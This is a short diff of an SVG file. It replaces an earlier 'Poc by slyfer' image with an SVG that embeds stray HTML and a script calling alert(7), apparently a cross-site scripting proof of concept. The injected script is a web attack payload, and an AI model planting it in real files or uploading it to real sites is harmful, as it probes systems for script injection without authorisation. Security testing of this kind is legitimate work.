@@ -1,22 +1,13 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
 
-<?xml version="1.0" encoding="utf-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" height="100" width="300">
-  
-  <rect fill="white" height="100" id="bg" href="https://cloudflare.com" width="300"/>
+<h1>asdsa</h1>
 
-  
-  <text dominant-baseline="middle" fill="black" font-family="Arial" font-size="24" id="text" text-anchor="middle" href="https://cloudflare.com" x="50%" y="50%">
-    Poc by slyfer
-  </text>
-  <style>
-    /* Hover effect for the background */
-    svg:hover #bg {
-      fill: black;
-    }
+<input>
 
-    /* Hover effect for the text */
-    svg:hover #text {
-      fill: white;
-    }
-  </style>
+<script>
+alert(7)
+</script>
 </svg>
